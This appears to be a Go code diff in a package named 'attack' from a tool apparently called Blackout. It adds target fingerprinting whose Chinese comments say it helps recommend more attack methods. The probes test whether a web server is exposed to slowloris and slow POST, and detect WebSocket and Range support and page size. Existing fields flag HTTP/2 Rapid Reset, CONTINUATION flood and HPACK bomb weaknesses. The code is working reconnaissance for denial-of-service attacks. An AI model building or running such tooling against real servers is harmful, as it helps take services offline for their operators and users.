@@ -3,6 +3,7 @@ package attack
 import (
 	"crypto/tls"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -32,6 +33,11 @@ type L7Fingerprint struct {
 	Vulnerable     bool `json:"vulnerable"`       // Rapid Reset
 	ContinuationVuln bool `json:"continuation_vuln"` // CONTINUATION Flood
 	BombVuln       bool `json:"bomb_vuln"`         // HPACK Bomb
+	// 能力探测（推荐扩展方法用）
+	WS            bool   `json:"ws"`              // WebSocket 支持（Upgrade 返回 101）
+	SlowApplicable bool  `json:"slow_applicable"` // 慢速适用：请求头无快速超时（>2s 不断开）
+	StaticRange   bool   `json:"static_range"`    // 支持 Range 请求（静态资源/CDN）
+	BodySize      int    `json:"body_size"`       // 首页响应体大小（bytes）
 	Notes      []string `json:"notes"`
 }
 
@@ -106,8 +112,100 @@ func FingerprintL7Target(target string, timeout time.Duration) *L7Fingerprint {
 		fp.HTTP2C = probeH2C(host, timeout)
 	}
 
+	// —— 扩展能力探测（为推荐更多攻击方法提供依据）——
+	fp.probeCapabilities(u, host, timeout)
+
 	fp.assessCVE44487()
 	return fp
+}
+
+// probeCapabilities 轻量能力探测（每个探测只发 1-2 个小请求/短连接）：
+//   - WebSocket 支持：Upgrade 请求是否回 101
+//   - 慢速适用性：不完整请求头是否在 2s 内被目标断开（有请求头超时则 slowloris 效果差）
+//   - Range/静态资源：Accept-Ranges 响应头
+//   - 首页响应体大小（判断动态/静态站点）
+func (fp *L7Fingerprint) probeCapabilities(u *url.URL, host string, timeout time.Duration) {
+	base := u.Scheme + "://" + host
+
+	// 1. WebSocket 支持（探测常见挂载路径；101 = 支持）
+	wsPaths := []string{"/", "/ws", "/websocket", "/socket.io/"}
+	for _, p := range wsPaths {
+		req, err := http.NewRequest("GET", base+p, nil)
+		if err != nil {
+			break
+		}
+		req.Header.Set("Connection", "Upgrade")
+		req.Header.Set("Upgrade", "websocket")
+		req.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
+		req.Header.Set("Sec-WebSocket-Version", "13")
+		req.Header.Set("User-Agent", "Blackout-Fingerprint/1.0")
+		resp, err := fingerprintClient.Do(req)
+		if err != nil {
+			continue
+		}
+		code := resp.StatusCode
+		resp.Body.Close()
+		if code == 101 {
+			fp.WS = true
+			fp.Notes = append(fp.Notes, "WebSocket endpoint detected at "+p+" (101 Upgrade)")
+			break
+		}
+	}
+
+	// 2. Range/静态资源 + 响应大小
+	req, err := http.NewRequest("GET", base+"/", nil)
+	if err == nil {
+		req.Header.Set("Range", "bytes=0-1023")
+		req.Header.Set("User-Agent", "Blackout-Fingerprint/1.0")
+		resp, err := fingerprintClient.Do(req)
+		if err == nil {
+			if resp.Header.Get("Accept-Ranges") == "bytes" || resp.StatusCode == 206 {
+				fp.StaticRange = true
+				fp.Notes = append(fp.Notes, "supports Range requests (static/CDN content)")
+			}
+			resp.Body.Close()
+		}
+	}
+
+	// 3. 慢速适用性：发不完整请求头，2s 内被断开 = 目标有请求头超时
+	addr := host
+	if _, _, err := net.SplitHostPort(addr); err != nil {
+		if u.Scheme == "https" {
+			addr = addr + ":443"
+		} else {
+			addr = addr + ":80"
+		}
+	}
+	conn, err := net.DialTimeout("tcp", addr, timeout)
+	if err == nil {
+		conn.SetDeadline(time.Now().Add(2 * time.Second))
+		// 不完整请求头（无结束空行）
+		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + u.Host + "\r\nUser-Agent: Blackout-Fingerprint/1.0\r\n"))
+		buf := make([]byte, 1)
+		n, _ := conn.Read(buf)
+		conn.Close()
+		if n > 0 {
+			// 目标主动回了数据（可能立即 400/断开）——需要区分：收到响应字节=有超时防护或已解析
+			fp.SlowApplicable = false
+			fp.Notes = append(fp.Notes, "server responds fast to partial headers (slowloris limited)")
+		} else {
+			// 2s 无响应：请求头等待中，slowloris/slow_post 适用
+			fp.SlowApplicable = true
+			fp.Notes = append(fp.Notes, "server holds partial headers (slowloris/slow POST applicable)")
+		}
+	}
+
+	// 4. 首页响应体大小（复用第一次 GET 的结果，此处单独取一次）
+	req2, err := http.NewRequest("GET", base+"/", nil)
+	if err == nil {
+		req2.Header.Set("User-Agent", "Blackout-Fingerprint/1.0")
+		resp, err := fingerprintClient.Do(req2)
+		if err == nil {
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
+			resp.Body.Close()
+			fp.BodySize = len(body)
+		}
+	}
 }
 
 // probeH2C 尝试与目标建立明文 HTTP/2 连接（发 preface+SETTINGS，等 SETTINGS 回应）
